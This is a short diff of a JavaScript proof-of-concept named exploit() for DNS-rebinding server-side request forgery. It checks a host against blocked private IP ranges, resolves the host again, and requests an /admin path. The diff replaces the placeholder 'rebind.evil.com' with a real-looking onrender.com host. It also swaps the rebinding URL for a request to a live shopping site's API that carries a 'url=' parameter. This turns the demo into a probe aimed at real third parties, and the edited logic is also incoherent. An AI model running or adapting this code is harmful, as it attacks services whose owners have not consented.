@@ -19,7 +19,7 @@ const BLOCKED_RANGES = [
 const isPrivateIP = (ip) => BLOCKED_RANGES.some(r => r.test(ip));
 
 async function exploit() {
-  const target = 'http://rebind.evil.com:8888/admin';
+  const target = 'https://cybernetics-pqvr.onrender.com:8888/admin';
   const parsed = new URL(target);
 
   // First resolution — validation
@@ -38,7 +38,7 @@ async function exploit() {
   console.log('[ATTACK] resolved to:', second);
 
   // Build URL using the resolved IP directly
-  const attackURL = `http://${second[0]}:8888/admin`;
+  const attackURL = `https://mall-api.kilimall.com/cart/items-count?url=https://google.com`;
   console.log('[*] Requesting:', attackURL);
 
   const response = await axios.get(attackURL);
